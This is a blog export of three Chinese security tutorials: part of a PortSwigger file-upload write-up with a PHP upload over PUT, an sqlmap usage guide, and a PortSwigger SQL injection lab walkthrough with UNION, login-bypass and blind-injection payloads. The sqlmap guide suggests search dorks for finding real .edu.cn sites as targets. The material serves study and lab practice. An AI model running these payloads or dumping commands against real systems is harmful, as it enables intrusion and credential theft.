<p>在允许您通过提供 URL 上传文件的函数中，也会出现类似的竞赛条件。在这种情况下，服务器必须通过互联网获取文件并创建本地副本，然后才能执行任何验证。</p>
<p>由于文件是使用 HTTP 加载的，开发人员无法使用框架的内置机制来安全地验证文件。相反，他们可能会手动创建自己的流程来临时存储和验证文件，但这样可能不太安全。</p>
<p>例如，如果文件被加载到一个名称随机的临时目录中，理论上攻击者就不可能利用任何竞赛条件。如果攻击者不知道目录名，就无法请求文件以触发文件的执行。另一方面，如果使用伪随机函数（如 PHP 的 uniqid()）生成随机目录名，就有可能被暴力破解。</p>
<p>为了让这种攻击更容易得手，可以尝试延长处理文件的时间，从而延长暴力破解目录名的时间窗口。一种方法是上传较大的文件。如果文件是分块处理的，你就有可能利用这一点，创建一个恶意文件，在文件开头添加有效载荷，然后添加大量任意填充字节。</p>
<h2 id="利用文件上传漏洞而不执行远程代码">利用文件上传漏洞而不执行远程代码</h2>
<p>在我们迄今为止看过的示例中，我们可以上传服务器端脚本以远程执行代码。这是文件上传功能不安全造成的最严重后果，但这些漏洞仍然可以通过其他方式被利用。</p>
<h3 id="上传恶意客户端脚本">上传恶意客户端脚本</h3>
<p>虽然您可能无法在服务器上执行脚本，但您仍然可以上传脚本进行客户端攻击。例如，如果可以上传 HTML 文件或 SVG 图像，就有可能使用 &lt;script&gt; 标记创建存储的 XSS 有效载荷。</p>
<p>如果上传的文件出现在其他用户访问的页面上，他们的浏览器在尝试呈现页面时就会执行脚本。请注意，由于同源策略的限制，这类攻击只有在上传的文件和您上传文件的同一源提供时才会起作用。</p>
<p>能上传带有恶意代码的文件是最严重的漏洞，这是针对服务器的攻击，但文件上传也能用于针对客户端攻击。上传一个 HTML  文件或 SVG 图像，里面包含 XSS 代码，那么就相当于是一个存储型 XSS 漏洞了，然后把文件的 URL  发给受害者，因为域名是合法的，所以更容易被信任。（注意，上传的文件如果被保存到另一个网站，那么要考虑同源策略的影响）</p>
<h3 id="使用-PUT-上传文件">使用 PUT 上传文件</h3>
<p>值得注意的是，某些网络服务器可能被配置为支持 PUT 请求。如果没有适当的防御措施，即使网络接口没有上传功能，也可以通过这种方式上传恶意文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /images/exploit.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line">Content-Length: <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Tip">Tip</h3>
<p>您可以尝试向不同的端点发送 OPTIONS 请求，以测试是否有任何端点宣布支持 PUT 方法。</p>
<h2 id="如何防止文件上传漏洞">如何防止文件上传漏洞</h2>
<p>允许用户上传文件已是司空见惯的事情，只要采取正确的预防措施，就不会有什么危险。一般来说，保护自己的网站免受这些漏洞攻击的最有效方法是实施以下所有做法：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对照允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名。猜测你可能希望允许哪些扩展名要比猜测攻击者可能试图上传哪些扩展名容易得多。</p>
</li>
<li class="lvl-2">
<p>确保文件名不包含任何可能被解释为目录或遍历序列（…/）的子串。</p>
</li>
<li class="lvl-2">
<p>重新命名上传的文件，避免可能导致现有文件被覆盖的碰撞。</p>
</li>
<li class="lvl-2">
<p>在完全验证之前，不要将文件上传到服务器的永久文件系统。</p>
</li>
<li class="lvl-2">
<p>尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。</p>
</li>
</ul>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/shawdow_bug/article/details/140149569">【Portswigger 学院】文件上传</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>靶场练习</category>
        <category>PortSwigger靶场</category>
      </categories>
      <tags>
        <tag>PortSwigger靶场</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【SQL注入】sqlmap</title>
    <url>/posts/23b5c41a/</url>
    <content><![CDATA[<h2 id="所有命令">所有命令</h2>
<p><img src="/posts/23b5c41a//image-20250316160541099.png" alt="image-20250316160541099"></p>
<span id="more"></span>
<p>SQLmap是一款「自动化」<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQL注入</a>工具，kali自带。路径 /usr/share/sqlmap</p>
<p>打开终端，输入<code>sqlmap</code>，出现以下界面，就说明SQLmap「可用」。</p>
<p><img src="/posts/23b5c41a//3323630f970599810ae0f763b683dfe5.png" alt="在这里插入图片描述"></p>
<p>本篇文章使用本地搭建的SQL-labs靶场作为「演示」目标，其他目标可使用必应搜索以下类型的网站：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inurl:news.asp?<span class="built_in">id</span>=site:edu.cn</span><br><span class="line">inurl:news.php?<span class="built_in">id</span>= site:edu.cn</span><br><span class="line">inurl:news.aspx?<span class="built_in">id</span>=site:edu.cn</span><br></pre></td></tr></table></figure>
<p><img src="/posts/23b5c41a//f8c3e9690521f33f60d6a89532b65714.png" alt="在这里插入图片描述"></p>
<h2 id="快速入门">快速入门</h2>
<p><strong>SQLmap（常规）使用步骤</strong></p>
<p>1、检测「注入点」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>2、查看所有「数据库」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<p>3、查看当前使用的数据库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --current-db</span><br></pre></td></tr></table></figure>
<p>4、查看「数据表」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>5、查看「字段」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p>6、查看「数据」</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h2 id="检测目标">检测目标</h2>
<p>检测「注入点」前，需要指定需要检测的「对象」。</p>
<h3 id="指定url">指定url</h3>
<p><code>-u</code> 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。</p>
<p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27;</span><br></pre></td></tr></table></figure>
<p>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p>
<p><img src="/posts/23b5c41a//image-20250316162233436.png" alt="image-20250316162233436"></p>
<h3 id="指定文件（批量检测）">指定文件（批量检测）</h3>
<p>准备一个「文件」，写上需要检测的多个url，一行一个。</p>
<p><code>-m</code> 指定文件，可以「批量扫描」文件中的url，需要确认就按y。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -m urls.txt</span><br></pre></td></tr></table></figure>
<h3 id="指定数据库-表-字段">指定数据库/表/字段</h3>
<p><code>-D</code> 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</p>
<p><code>-T</code> 指定目标「表」，单/双引号包裹，常配合其他参数使用。</p>
<p><code>-C</code> 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<h3 id="post请求">post请求</h3>
<p>检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。</p>
<p><code>-r</code> 指定需要检测的文件，SQLmap会通过post请求方式检测目标。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r bp.txt</span><br></pre></td></tr></table></figure>
<h3 id="cookie注入">cookie注入</h3>
<p><code>--cookie</code> 指定cookie的值，单/双引号包裹。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://xx?id=x&quot;</span> --cookie <span class="string">&#x27;cookie&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="WAF绕过">WAF绕过</h3>
<p><code>--tamper</code> 指定绕过脚本，绕过WAF或ids等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tamper <span class="string">&#x27;space2comment.py&#x27;</span></span><br></pre></td></tr></table></figure>
<p>SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：</p>
<p><img src="/posts/23b5c41a//image-20250316163642927.png" alt="image-20250316163642927"></p>
<p>脚本按照用途命名，比如 <a href="http://space2comment.py">space2comment.py</a> 是指，用/**/代替空格。</p>
<p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p>
<h3 id="其他">其他</h3>
<p><code>--batch</code> （默认确认）不再询问是否确认。</p>
<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
<p><code>--method=GET</code> 指定请求方式（GET/POST）</p>
<p><code>--random-agent</code> 随机切换UA（User-Agent）</p>
<p><code>--user-agent ' '</code> 使用自定义的UA（User-Agent）</p>
<p><code>--referer ' '</code> 使用自定义的 referer</p>
<p><code>--proxy=&quot;127.0.0.1:8080&quot;</code> 指定代理</p>
<p><code>--threads 10</code> 设置线程数，最高10</p>
<p><code>--risk=1</code> 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p>
<p><code>--level 1</code> 执行测试的等级（1-5，默认为1，常用3）</p>
<h2 id="脱库">脱库</h2>
<p>获取所有内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -a</span><br></pre></td></tr></table></figure>
<p><code>-a</code> 就是 all 的意思，获取所有能获取的内容，会消耗很长时间。</p>
<h3 id="获取数据库">获取数据库</h3>
<p><code>--dbs</code> 获取数据库</p>
<p><strong>1、获取数据库版本</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; -b</span><br></pre></td></tr></table></figure>
<p><strong>2、获取当前使用的数据库</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://xx/?id=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
<p><strong>3、获取所有数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --dbs</span><br></pre></td></tr></table></figure>
<h3 id="获取表">获取表</h3>
<p><code>--tables</code> 获取表</p>
<p><strong>1、获取表，可以指定数据库</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>2、同时获取多个库的表名，库名用逗号分隔。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security,sys&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<p><strong>3、不指定数据库，默认获取每个数据库中所有的表。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
<h3 id="获取字段">获取字段</h3>
<p><code>--columns</code> 参数用来获取字段。</p>
<p><strong>1、获取字段，可以指定库和表</strong></p>
<p>提示：只指定库名但不指定表名会报错。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<p><strong>2、不指定表名，默认获取当前数据库中所有表的字段。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
<h3 id="获取字段类型">获取字段类型</h3>
<p><code>--schema</code> 获取字段类型，可以指定库或指定表。不指定则获取数据库中每个表所有字段的类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --schema</span><br></pre></td></tr></table></figure>
<h3 id="获取值（数据）">获取值（数据）</h3>
<p><code>--dump</code> 获取值，也就是表中的数据。可以指定具体的库、表、字段。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> -C <span class="string">&#x27;username,password&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>获取指定库中所有表的数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --dump</span><br></pre></td></tr></table></figure>
<p>默认获取表中的所有数据，可以使用 <code>--start</code> <code>--stop</code> 指定开始和结束的行，只获取一部分数据。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --start 1 --stop 5  --dump</span><br></pre></td></tr></table></figure>
<h3 id="获取用户">获取用户</h3>
<p><strong>1、获取当前登录数据库的用户</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.31.180/sqli-labs-master/Less-1/?id=1&#x27; --current-user</span><br></pre></td></tr></table></figure>
<p><strong>2、获取所有用户</strong></p>
<p><code>--users</code> 获取数据库的所有用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --<span class="built_in">users</span></span><br></pre></td></tr></table></figure>
<p><strong>3、获取用户密码</strong></p>
<p><code>--passwords</code> 获取所有数据库用户的密码（哈希值）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --passwords</span><br></pre></td></tr></table></figure>
<p>数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。最后面显示数据库用户名对应的密码的哈希值。</p>
<p><strong>6.4、获取用户权限</strong></p>
<p><code>--privileges</code> 查看每个数据库用户都有哪些权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --privileges</span><br></pre></td></tr></table></figure>
<p><strong>6.5、判断当前用户是不是管理员</strong></p>
<p><code>--is-dba</code> 判断当前登录的用户是不是数据库的管理员账号。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --is-dba</span><br></pre></td></tr></table></figure>
<p>如果是管理员，就在最后面显示 true。</p>
<h3 id="获取主机名">获取主机名</h3>
<p><code>--hostname</code> 获取服务器主机名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --hostname</span><br></pre></td></tr></table></figure>
<h3 id="搜索库、表、字段。">搜索库、表、字段。</h3>
<p><code>--search</code> 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。</p>
<p>搜索数据库中有没有 security 这个数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -D <span class="string">&#x27;security&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果。</p>
<p><img src="/posts/23b5c41a//image-20250316163205508.png" alt="image-20250316163205508"></p>
<p>也可以搜索表</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xxx/?id=1&#x27;</span> -T <span class="string">&#x27;users&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<p>或者搜索字段</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> -C <span class="string">&#x27;username&#x27;</span> --search</span><br></pre></td></tr></table></figure>
<h3 id="正在执行的SQL语句">正在执行的SQL语句</h3>
<p><code>--statements</code> 获取数据库中正在执行的SQL语句。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xx/?id=1&#x27;</span> --statements </span><br></pre></td></tr></table></figure>
<p>本文参考：</p>
<p><a href="https://blog.csdn.net/wangyuxiang946/article/details/131236510">SQLmap使用教程图文教程（超详细）</a></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger学院】SQL 注入</title>
    <url>/posts/3b7c6011/</url>
    <content><![CDATA[<h2 id="SQL注入漏洞语句允许检索隐藏数据的位置">SQL注入漏洞语句允许检索隐藏数据的位置</h2>
<p>这个是查看隐藏数据的漏洞，比较简单。通过BurpSuite直接拦截修改就行。</p>
<p><img src="/posts/3b7c6011//image-20250305143611182.png" alt="image-20250305143611182"></p>
<p>之所以能隐藏信息是因为后端的查询语句是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>因此通过我们的修改注释掉了<code>AND released = 1</code></p>
<p><strong>思考</strong>：</p>
<p>首先对后端查询语句要有一定敏感程度，另外如果AND后的语句在前是否就避免了这个漏洞呢？</p>
<span id="more"></span>
<h2 id="SQL注入漏洞允许登录绕过">SQL注入漏洞允许登录绕过</h2>
<p>这个也非常简单，注释掉password就可以登录任意用户了。</p>
<p><img src="/posts/3b7c6011//image-20250305144942049.png" alt="image-20250305144942049"></p>
<p><strong>思考</strong>：</p>
<p>对之前挖的几个平台做了一下尝试，没出意外都失败了。果然这么简单的洞不太好遇见。</p>
<h2 id="SQL注入UNION攻击，确定查询返回的列数">SQL注入UNION攻击，确定查询返回的列数</h2>
<p>这个使用<code>?category=Accessones' order by 3--</code>时不报错，使用<code>?category=Accessones' order by 4--</code>时报错，说明返回列有三个。但是不能直接过关，需要使用<code>'?category=Accessones'UNION SELECT NULL,NULL,NULL--</code>过关</p>
<p><img src="/posts/3b7c6011//image-20250305153505747.png" alt="image-20250305153505747"></p>
<p>我们可以看到，虽然执行<code>order by 4</code>的时候报错，但是报错代码为500说明还是执行了的。在portswigger中提到：</p>
<blockquote>
<p>​            As with the <code>ORDER BY</code> technique, the application might actually return the database error in its HTTP response, but may  return a generic error or simply return no results. When the number of  nulls matches the number of columns, the database returns an additional  row in the result set, containing null values in each column. The effect on the HTTP response depends on the application’s code. If you are  lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a <code>NullPointerException</code>. In the  worst case, the response might look the same as a response caused by an  incorrect number of nulls. This would make this method ineffective.</p>
</blockquote>
<p>因此报错语句可以作为是否存在UNION漏洞的参考</p>
<p>在 Oracle 中，每个 SELECT 查询都必须使用 FROM 关键字，并指定一个有效的表。Oracle 上有一个名为 dual 的内置表，可用于此目的。因此，在 Oracle 上注入的查询必须如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT NULL FROM DUAL--</span></span><br></pre></td></tr></table></figure>
<p>MySQL 中，<code>--</code>后必须跟一个空格。</p>
<p>有关数据库特定语法的更多详情，请参阅 <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<h2 id="SQL注入UNION攻击，找到包含文本的列">SQL注入UNION攻击，找到包含文本的列</h2>
<p>让找哪个列支持查找字符串，找出一共多少列以后，挨个试试就可以了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abcdef<span class="string">&#x27;,NULL,NULL--</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">?category=Accessories%&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;Y5LIpq&#x27;</span>,<span class="keyword">null</span><span class="comment">--+</span></span><br><span class="line">或者</span><br><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; and 1=2 union select null,&#x27;</span>Y5LIpq<span class="string">&#x27;,null--+</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL初入UNION攻击，从其他表中检索数据">SQL初入UNION攻击，从其他表中检索数据</h2>
<p>让检索出管理员账号密码，然后登陆管理员的账号。这道题的重点是当遇到两个能检索出字符串的列时，如何利用。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL注入UNION攻击，在单列中检索多个值">SQL注入UNION攻击，在单列中检索多个值</h2>
<p>当只有一个string列可以被检索时，需要将两个列的内容连接到一个列。</p>
<ol>
<li class="lvl-3">
<p>首先通过之前的办法看看有几个可以检索的列</p>
</li>
<li class="lvl-3">
<p>然后检测哪一个列可以检索字符串</p>
</li>
<li class="lvl-3">
<p>最后合并检索用户名和密码</p>
</li>
</ol>
<p>通过检测，可以检索的列有两个，第二个可以检索字符串。将用户名和密码合并到第二列中即可，注入代码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,username||&#x27;</span><span class="operator">~</span><span class="operator">~</span><span class="operator">~</span><span class="string">&#x27;||password+from+users--</span></span><br></pre></td></tr></table></figure>
<p>不同的数据库使用不同的语法来执行字符串连接。有关详细信息，请参阅<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a>。</p>
<p>| Oracle     | <code>                   'foo'||'bar'               </code> |<br>
| ---------- | -------------------------------------------------- |<br>
| Microsoft  | <code>                   'foo'+'bar'               </code>  |<br>
| PostgreSQL | <code>                   'foo'||'bar'               </code> |<br>
| MySQL      | CONCAT(‘foo’,‘bar’)                                |</p>
<p>然而在实际情况下，我们并不能像题目所给出的那样直接获得表名和列名。因此，现实中，我们需要首先获得数据库的表名和列名，才能对其进行查询。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,table_name from information_schema.tables--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">列：username,password</span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">数据:administrator<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span>lcv555mv2prf2m81w40v</span><br><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; union select null,concat(username,&#x27;</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&#x27;,password) from users--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">利用administrator登录</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-注入攻击，查询-MySQL-和-Microsoft-的数据库类型和版本">SQL 注入攻击，查询 MySQL 和 Microsoft 的数据库类型和版本</h2>
<p>获得数据库的版本号，比较简单。各个数据库查询数据库版本的语句如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">Database type</th>
<th>Query</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Microsoft</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td style="text-align:left">Oracle</td>
<td><code>SELECT * FROM v$version</code><br><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code></td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody>
</table>
<p>查询SQL版本的语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union+select+null,@@version-- +</span></span><br></pre></td></tr></table></figure>
<p>思考：</p>
<p>发现了一个问题，在执行SQL注入时，使用<code>--</code>进行注释时需要在其后添加一个空格，即<code>-- +</code>。然而刚开始并没有加但是还是过了，因此需要注意。另外这一题是可以使用<code>#</code>来注释的，但是前面的却不行，原因目前还不明白。</p>
<h2 id="SQL-注入攻击，列出非-Oracle-数据库的数据库内容">SQL 注入攻击，列出非 Oracle 数据库的数据库内容</h2>
<p>这一题题目没有给表单和列名，更切合实际情况，实际上跟上面的是一致的。不再过多叙述。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;union select &#x27;</span>a<span class="string">&#x27;,null-- =</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables<span class="comment">-- =</span></span><br><span class="line"><span class="string">&#x27;union select column_name,null from information_schema.columns where table_name=&#x27;</span>users_vorbge<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> username_ucmiyr<span class="operator">||</span><span class="string">&#x27;~~~&#x27;</span><span class="operator">||</span>password_unmsjv,<span class="keyword">null</span> <span class="keyword">from</span> users_vorbge<span class="comment">-- =</span></span><br></pre></td></tr></table></figure>
<h2 id="利用条件响应进行盲目-SQL-注入">利用条件响应进行盲目 SQL 注入</h2>
<p>在开始这道题之前呢，有必要了解一下，要解决这道题是有三个必要条件的：</p>
<ol>
<li class="lvl-3">
<p><strong>正确和错误的cookie的返回包存在差异</strong></p>
</li>
</ol>
<p>起初我是很困惑我要多么小心翼翼才能发现<code>Welcome back!</code>这一句话的小小差异。然后我就恍然大悟了，我们直接对比response包的大小，如果不一样再找出哪儿不一样就可以了。</p>
<ol start="2">
<li class="lvl-3">
<p><strong>cookie允许盲注</strong></p>
</li>
</ol>
<p>即在cookie后添加<code>'AND '1'='1</code>和添加<code>'AND '1'='2</code>返回的结果是不同的</p>
<ol start="3">
<li class="lvl-3">
<p><strong>我们要查询的表名和列名</strong></p>
</li>
</ol>
<p>虽然题目直接给了我们表名和列名，当我们都知道，实际情况中并不会有公司摆着洞给我们挖。因此有没有办法通过盲注获得我们需要的表名和列名呢？那当然是有的。</p>
<p>我们要知道，盲注语句是否执行成功我们是可以知道的。那么，是否存在一个表单或者列名，我们也是可以了解的。因此，我们依然可以通过盲注的方式获得表名和列名。</p>
<p>所以是可以使用Python写脚本爆破的，当然也可以用sqlmap工具，非常简便。</p>
<p><font class="notice">我打算再写一篇sqlmap的用法总结，先这里插个眼</font></p>
